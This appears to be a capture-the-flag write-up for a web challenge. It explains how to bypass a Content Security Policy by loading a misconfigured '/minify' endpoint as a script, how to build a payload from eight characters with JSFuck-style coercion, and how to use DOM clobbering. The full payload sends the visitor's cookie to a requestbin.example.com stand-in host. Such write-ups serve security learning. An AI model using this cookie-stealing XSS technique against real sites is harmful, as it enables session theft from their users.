There is an obvious XSS vunlerability in the `/:codeId` page, but because of CSP it's impossible to inject inline or external scripts.

You can use the endpoint `/minify` as JavaScript code, because the endpoint doesn't set `content-type` header properly. This means that you have to write XSS payload using only 8 characters: `><+-=[]r`.

Note that you can inject any HTML and the character `r` is allowed in the `/minify` endpoint, so thanks to DOM Clobbering you can access DOM elements.

The basic idea of payload is as below.

```js
element['ownerDocument']['defaultView']['location']='https://requestbin.example.com/?'+element['ownerDocument']['cookie']
```

According to [jsfuck](https://github.com/aemkei/jsfuck), You can build the string `alt` in the following way:

```js
// 'alt' === 'NaN'[1] + 'false'[2] + 'true'[0]
console.log(
    [+[][[]]+[]][+[]][++[[]][+[]]]+[[[[]>[]][+[]]]+[]][+[]][++[++[[]][+[]]][+[]]]+[[[]>=[]]+[]][+[]][+[]]
) // 'alt'
```

So you can get an arbitrary string by accessing DOM elements through the `alt` attribute of `img` elements you injected.

```html
<!-- payload example -->
<img alt="ownerDocument" id="rr">
<img alt="defaultView" id="rrr">
<img alt="location" id="rrrr">
<img alt="cookie" id="rrrrr">
<a href="https://requestbin.example.com/?" id="rrrrrr"></a>
<script src="/minify?code=rr%5Brr%5Br%3D%5B%2B%5B%5D%5B%5B%5D%5D%2B%5B%5D%5D%5B%2B%5B%5D%5D%5B%2B%2B%5B%5B%5D%5D%5B%2B%5B%5D%5D%5D%2B%5B%5B%5B%5B%5D%3E%5B%5D%5D%5B%2B%5B%5D%5D%5D%2B%5B%5D%5D%5B%2B%5B%5D%5D%5B%2B%2B%5B%2B%2B%5B%5B%5D%5D%5B%2B%5B%5D%5D%5D%5B%2B%5B%5D%5D%5D%2B%5B%5B%5B%5D%3E%3D%5B%5D%5D%2B%5B%5D%5D%5B%2B%5B%5D%5D%5B%2B%5B%5D%5D%5D%5D%5Brrr%5Br%5D%5D%5Brrrr%5Br%5D%5D%3Drrrrrr%2Brr%5Brr%5Br%5D%5D%5Brrrrr%5Br%5D%5D"></script>
```

The JS part with comments:

```js
rr[
    // r === 'alt'
    // 'ownerDocument'
    rr[r=[+[][[]]+[]][+[]][++[[]][+[]]]+[[[[]>[]][+[]]]+[]][+[]][++[++[[]][+[]]][+[]]]+[[[]>=[]]+[]][+[]][+[]]]
][
    // 'defaultView'
    rrr[r]
][
    // 'location'
    rrrr[r]
] = rrrrrr /* rrrrrr.toString() === rrrrrr.href */ + rr[
    // 'ownerDocument'
    rr[r]
][
    // 'cookie'
    rrrrr[r]
]
```

After sending the payload to `/submit` and reporting the poisoned page, a cralwer will visit the page and access your server with the flag.
